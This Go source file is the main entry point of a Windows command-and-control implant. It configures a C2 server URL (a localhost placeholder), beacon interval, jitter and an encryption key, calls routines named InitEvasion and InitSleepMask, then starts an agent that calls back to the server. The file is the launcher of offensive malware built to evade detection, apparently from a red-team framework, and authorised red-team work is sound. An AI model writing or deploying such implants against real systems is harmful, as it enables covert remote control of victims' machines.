//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"fmt"
	"os"
)

var (
	C2Url       = "https://127.0.0.1:443"
	CallbackInterval = "5"
	JitterStr   = "10"
	AgentUUID   = ""
	EncKey      = ""
)

func main() {
	initAPI()
	InitEvasion()
	InitSleepMask()

	sleep := DefaultSleep
	jitter := float64(DefaultJitter)
	key := []byte{}
	if EncKey != "" {
		var err error
		key, err = base64.StdEncoding.DecodeString(EncKey)
		if err != nil {
			key = []byte{}
		}
	}

	if CallbackInterval != "" {
		if s, err := fmt.Sscanf(CallbackInterval, "%d", &sleep); err != nil || s != 1 {
			sleep = DefaultSleep
		}
	}

	if JitterStr != "" {
		var j float64
		if s, err := fmt.Sscanf(JitterStr, "%f", &j); err != nil || s != 1 {
			jitter = float64(DefaultJitter)
		} else {
			jitter = j
		}
	}

	agent := NewAgent(C2Url, AgentUUID, key, sleep, jitter)
	agent.Run()

	os.Exit(0)
}
